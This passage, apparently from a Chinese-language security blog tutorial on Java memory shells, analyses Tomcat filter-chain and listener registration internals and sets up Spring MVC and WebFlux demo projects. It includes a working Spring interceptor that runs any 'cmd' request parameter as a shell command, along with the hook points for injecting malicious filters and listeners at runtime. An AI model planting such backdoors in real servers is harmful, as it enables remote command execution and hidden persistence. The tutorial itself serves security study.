&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var10 = filterMaps;</span><br><span class="line">            var11 = filterMaps.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(var12 = <span class="number">0</span>; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    <span class="keyword">if</span> (filterConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在该方法和下面定义<code>filterMaps</code>那行下断点进行调试，可以看到，这段代码先是判断<code>servlet</code>是否为空，如果是就表示没有有效的<code>servlet</code>，无法创建过滤器链；然后根据传入的<code>ServletRequest</code>的类型来分类处理，如果是<code>Request</code>类型，并且启用了安全性，那么就创建一个新的<code>ApplicationFilterChain</code>，如果没启用，那么就尝试从请求中获取现有的过滤器链，如果不存在那么就创建一个新的；接着是设置过滤器链的<code>Servlet</code>和异步支持属性，这个没啥说的；关键点在于后面从<code>Wrapper</code>中获取父级上下文（<code>StandardContext</code>），然后获取该上下文中定义的过滤器映射数组（<code>FilterMap</code>）；最后遍历过滤器映射数组，根据请求的<code>DispatcherType</code>和请求路径匹配过滤器，并将匹配的过滤器添加到过滤器链中，最终返回创建或更新后的过滤器链。</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117004652307.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117004728760.png"></p><p>从上面的两张图我们也可以清晰地看到<code>filterConfig</code>、<code>filterMap</code>、<code>FilterDef</code>的结构。</p><p>跟进刚才的<code>filterChain.doFilter</code>方法，位于<code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117005026102.png"></p><p>可以看到都是调用了<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>方法，在这个方法中会依次拿到<code>filterConfig</code>和<code>filter</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117005923310.png"></p><p>好了，大致过程到这里就结束了，但是我们的目的是打入内存马，也就是要动态地创建一个<code>Filter</code>，回顾之前的调试过程，我们发现在<code>createFilterChain</code>那个函数里面有两个关键点：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117010603894.png"></p><p>也就是这里我用箭头指出来的<code>org.apache.catalina.core.StandardContext#findFilterMaps</code>和<code>org.apache.catalina.core.StandardContext#findFilterConfig</code>。</p><p>二者的实现代码粘贴如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FilterMap[] findFilterMaps() &#123;</span><br><span class="line">    <span class="keyword">return</span> filterMaps.asArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> FilterConfig <span class="title function_">findFilterConfig</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (filterDefs) &#123;</span><br><span class="line">        <span class="keyword">return</span> filterConfigs.get(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说我们只需要查找到现有的上下文，然后往里面插入我们自定义的恶意过滤器映射和过滤器配置，就可以实现动态添加过滤器了。</p><p>那也就是说，我们现在的问题就转化为如何添加<code>filterMap</code>和<code>filterConfig</code>。我们搜索关键词<code>addFilterMap</code>，即可看到在<code>StandardContext</code>中有两个相关的方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117131207868.png"></p><p>注释里面也说的很清楚，<code>addFilterMap</code>是在一组映射末尾添加新的我们自定义的新映射；而<code>addFilterMapBefore</code>则会自动把我们创建的<code>filterMap</code>丢到第一位去，无需再手动排序，这正是我们需要的呀！</p><p>可以看到，上面的<code>addFilterMapBefore</code>函数中第一步是先执行<code>org.apache.catalina.core.StandardContext#validateFilterMap</code>这个函数，点击去看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117131938707.png"></p><p>发现我们需要保证它在根据<code>filterName</code>找<code>filterDef</code>的时候，得能找到，也就是说，我们还得自定义<code>filterDef</code>并把它加入到<code>filterDefs</code>，不过这个也很简单，也有对应的方法，也就是<code>org.apache.catalina.core.StandardContext#addFilterDef</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117132121464.png"></p><p>搞定，继续去看<code>filterConfig</code>如何添加。经过搜索发现，不存在类似上面的<code>addFilterConfig</code>这种方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117132257971.png"></p><p>但是有<code>filterStart</code>和<code>filterStop</code>这两个方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117135001440.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117135022708.png"></p><p>那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。</p><h2 id="2-7-Listener简单介绍"><a href="#2-7-Listener简单介绍" class="headerlink" title="2.7 Listener简单介绍"></a>2.7 Listener简单介绍</h2><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/tomcat.png"></p><p>由上图可知，<code>Listener</code>是最先被加载的，所以根据前面我们学到的思路，我动态注册一个恶意的<code>Listener</code>，就又可以形成一种内存马了。</p><p>在<code>tomcat</code>中，常见的<code>Listener</code>有以下几种：</p><ul><li><code>ServletContextListener</code>，用来监听整个<code>Web</code>应用程序的启动和关闭事件，需要实现<code>contextInitialized</code>和<code>contextDestroyed</code>这两个方法；</li><li><code>ServletRequestListener</code>，用来监听<code>HTTP</code>请求的创建和销毁事件，需要实现<code>requestInitialized</code>和<code>requestDestroyed</code>这两个方法；</li><li><code>HttpSessionListener</code>，用来监听<code>HTTP</code>会话的创建和销毁事件，需要实现<code>sessionCreated</code>和<code>sessionDestroyed</code>这两个方法；</li><li><code>HttpSessionAttributeListener</code>，监听<code>HTTP</code>会话属性的添加、删除和替换事件，需要实现<code>attributeAdded</code>、<code>attributeRemoved</code>和<code>attributeReplaced</code>这三个方法。</li></ul><p>很明显，<code>ServletRequestListener</code>是最适合做内存马的，因为它只要访问服务就能触发操作。</p><h2 id="2-8-编写一个简单的Listener（ServletRequestListener）"><a href="#2-8-编写一个简单的Listener（ServletRequestListener）" class="headerlink" title="2.8 编写一个简单的Listener（ServletRequestListener）"></a>2.8 编写一个简单的Listener（ServletRequestListener）</h2><p>我们继续用我们之前在<code>2.2</code>中搭建的环境，替换掉之前的<code>TestFilter.java</code>，重新写一个<code>TestListener.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] initial TestListener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117193153492.png"></p><h2 id="2-9-从代码层面分析Listener运行的整体流程"><a href="#2-9-从代码层面分析Listener运行的整体流程" class="headerlink" title="2.9 从代码层面分析Listener运行的整体流程"></a>2.9 从代码层面分析Listener运行的整体流程</h2><p>我们在如图所示的两个地方下断点调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117193334272.png"></p><p>往下翻可以看到<code>org.apache.catalina.core.StandardContext#listenerStart</code>方法的调用：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117193516785.png"></p><p>代码写的通俗易懂，主要有两个事情要干，一是通过<code>findApplicationListeners</code>找到这些<code>Listerner</code>的名字；二是实例化这些<code>listener</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117213700704.png"></p><p>接着就是分类摆放，我们需要的<code>ServletRequestListener</code>被放在了<code>eventListeners</code>里面：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117223551872.png"></p><p>分类摆放完了之后，干这样一件事情：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));</span><br></pre></td></tr></table></figure><p><code>Arrays.asList(...)</code> 好理解，意思就是将数组转换为列表；<code>eventListeners.addAll(...)</code>也好理解，意思就是将括号里面的内容添加到之前实例化的监听器列表 <code>eventListeners</code> 中。关于括号里边的<code>org.apache.catalina.core.StandardContext#getApplicationEventListeners</code>这个方法，我们点进去看，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也很简单明了，就是把<code>applicationEventListenersList</code>转换成一个包含任意类型对象的数组，也就是一个可能包含各种类型的应用程序事件监听器的数组。</p><p>那这总结起来就一句话，就是<code>Listener</code>有两个来源，一是根据<code>web.xml</code>文件或者<code>@WebListener</code>注解实例化得到的<code>Listener</code>；二是<code>applicationEventListenersList</code>中的<code>Listener</code>。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的<code>addFilterConfig</code>这种函数呢？当然是有的，<code>ctrl+左键</code>往上找：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117225625995.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117225704881.png"></p><p>方法名字叫做<code>addApplicationEventListener</code>，在<code>StandardContext.java</code>里面，代码如下，完美符合我们的需求，真是太哇塞了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">    applicationEventListenersList.add(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-10-简单的spring项目搭建"><a href="#2-10-简单的spring项目搭建" class="headerlink" title="2.10 简单的spring项目搭建"></a>2.10 简单的spring项目搭建</h2><p>新建个项目，设置<code>Server URL</code>为<code>https://start.aliyun.com/</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118010240710.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118010435462.png"></p><p>等待依赖解析完成：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118010538774.png"></p><p>这里给我们准备了一个示例，我们可以直接跑起来：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118011103790.png"></p><h3 id="2-10-1-编写一个简单的Spring-Controller"><a href="#2-10-1-编写一个简单的Spring-Controller" class="headerlink" title="2.10.1 编写一个简单的Spring Controller"></a>2.10.1 编写一个简单的Spring Controller</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springcontrollermemoryshellexample.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常地简单：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118011631123.png"></p><h3 id="2-10-2-编写一个简单的Spring-Interceptor"><a href="#2-10-2-编写一个简单的Spring-Interceptor" class="headerlink" title="2.10.2 编写一个简单的Spring Interceptor"></a>2.10.2 编写一个简单的Spring Interceptor</h3><p><code>TestInterceptor.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springcontrollermemoryshellexample.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.<span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">inputScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(processBuilder.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                output = inputScanner.hasNext() ? inputScanner.next(): output;</span><br><span class="line">                inputScanner.close();</span><br><span class="line">                writer.write(output);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored)&#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WebConfig.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springcontrollermemoryshellexample.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">TestInterceptor</span>()).addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Controller</code>就是之前写的<code>TestController.java</code>，运行后访问<code>http://127.0.0.1:8080/?cmd=whoami</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119205649551.png"></p><h3 id="2-10-3-编写一个简单的Spring-WebFlux的Demo（基于Netty）"><a href="#2-10-3-编写一个简单的Spring-WebFlux的Demo（基于Netty）" class="headerlink" title="2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）"></a>2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）</h3><p>我们先聊聊怎么自己写一个<code>Spring WebFlux</code>框架的<code>demo</code>。</p><p>这里我们新建一个<code>SpringBoot</code>项目，取名<code>WebFluxMemoryShellDemo</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121181613825.png"></p><p>这里选择<code>Spring Reactive Web</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121182533113.png"></p><p>接着新建两个文件，这里为了方便，我把这两个文件放到<code>hello</code>文件夹下。</p><p><code>GreetingHandler.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.webfluxmemoryshelldemo.hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.BodyInserters;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerResponse;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Mono&lt;ServerResponse&gt; <span class="title function_">hello</span><span class="params">(ServerRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue(<span class="string">&quot;Hello, Spring!&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>GreetingRouter.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.webfluxmemoryshelldemo.hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingRouter</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="title function_">route</span><span class="params">(GreetingHandler greetingHandler)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RouterFunctions.route(RequestPredicates.GET(<span class="string">&quot;/hello&quot;</span>).and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以新建<code>main/resources</code>文件夹，然后新建<code>application.properties</code>，通过<code>server.port</code>来控制<code>netty</code>服务的端口：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121182911474.png"></p><p>接着我们运行：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121183100943.png"></p><p>这里我从<code>github</code>上找了一个项目，也可以很好地帮助我们理解这个框架是如何使用的，它采用的是<code>Netty</code>+<code>SpringWebFlux</code>：</p><blockquote><p><a href="https://github.com/Java-Techie-jt/springboot-webflux-demo">https://github.com/Java-Techie-jt/springboot-webflux-demo</a></p></blockquote><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121135125819.png"></p><p>随便访问个路由。例如<code>http://127.0.0.1:9191/customers/stream</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/customers_stream.gif"></p><h2 id="2-11-Spring-MVC介绍"><a href="#2-11-Spring-MVC介绍" class="headerlink" title="2.11 Spring MVC介绍"></a>2.11 Spring MVC介绍</h2><p>如果想要深入理解<code>Spring MVC</code>框架型内存马，那么对<code>Spring MVC</code>的基础了解是非常必要的，本节就从源码层面和大家简单聊聊这个框架。</p><p>首先引用《<code>Spring in Action</code>》上的一张图（这里我重制了一下）来了解<code>Spring MVC</code>的核心组件和大致处理流程（不过我在第五版书上貌似没有找到这张图，有找到的小伙伴可以公众号后台私信我）：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/springmvc2.png"></p><p>可以看到，这里有一堆名词，我们一一来看：</p><ul><li><code>DispatcherServlet</code>是前端控制器，它负责接收<code>Request</code>并将<code>Request</code>转发给对应的处理组件；</li><li><code>HandlerMapping</code>负责完成<code>url</code>到<code>Controller</code>映射，可以通过它来找到对应的处理<code>Request</code>的<code>Controller</code>；</li><li><code>Controller</code>处理<code>Request</code>，并返回<code>ModelAndVIew</code>对象，<code>ModelAndView</code>是封装结果视图的组件；</li><li>④~⑦表示视图解析器解析<code>ModelAndView</code>对象并返回对应的视图给客户端。</li></ul><p>还有一个概念需要了解，就是<code>IOC</code>容器，因为这个名词会在本文后面的内容中提及。</p><p><code>IOC</code>（控制反转）容器是<code>Spring</code>框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。<code>IOC</code>容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。<code>Spring</code>框架提供了多种实现<code>IOC</code>容器的方式，下面讲两种常见的：</p><ul><li><p><code>BeanFactory</code>：<code>Spring</code>的最基本的<code>IOC</code>容器，提供了基本的<code>IOC</code>功能，只有在第一次请求时才创建对象。</p></li><li><p><code>ApplicationContext</code>：这是<code>BeanFactory</code>的扩展，提供了更多的企业级功能。<code>ApplicationContext</code>在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。</p></li></ul><h3 id="2-11-1-Spring-MVC九大组件"><a href="#2-11-1-Spring-MVC九大组件" class="headerlink" title="2.11.1 Spring MVC九大组件"></a>2.11.1 Spring MVC九大组件</h3><p>这九大组件需要有个印象：</p><p><code>DispatcherServlet</code>（派发<code>Servlet</code>）：负责将请求分发给其他组件，是整个<code>Spring MVC</code>流程的核心；<br><code>HandlerMapping</code>（处理器映射）：用于确定请求的处理器（<code>Controller</code>）；<br><code>HandlerAdapter</code>（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；<br><code>HandlerInterceptor</code>（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；<br><code>Controller</code>（控制器）：处理用户请求并返回适当的模型和视图；<br><code>ModelAndView</code>（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；<br><code>ViewResolver</code>（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；<br><code>LocaleResolver</code>（区域解析器）：处理区域信息，用于国际化；<br><code>ThemeResolver</code>（主题解析器）：用于解析<code>Web</code>应用的主题，实现界面主题的切换。</p><h3 id="2-11-2-简单的源码分析"><a href="#2-11-2-简单的源码分析" class="headerlink" title="2.11.2 简单的源码分析"></a>2.11.2 简单的源码分析</h3><h4 id="2-11-2-1-九大组件的初始化"><a href="#2-11-2-1-九大组件的初始化" class="headerlink" title="2.11.2.1 九大组件的初始化"></a>2.11.2.1 九大组件的初始化</h4><p>首先是找到<code>org.springframework.web.servlet.DispatcherServlet</code>，可以看到里面有很多组件的定义和初始化函数以及一些其他的函数：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118153801770.png"></p><p>但是没有<code>init()</code>函数，我们翻看其父类<code>FrameworkServlet</code>的父类<code>org.springframework.web.servlet.HttpServletBean</code>的时候发现有<code>init</code>函数：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118153925178.png"></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 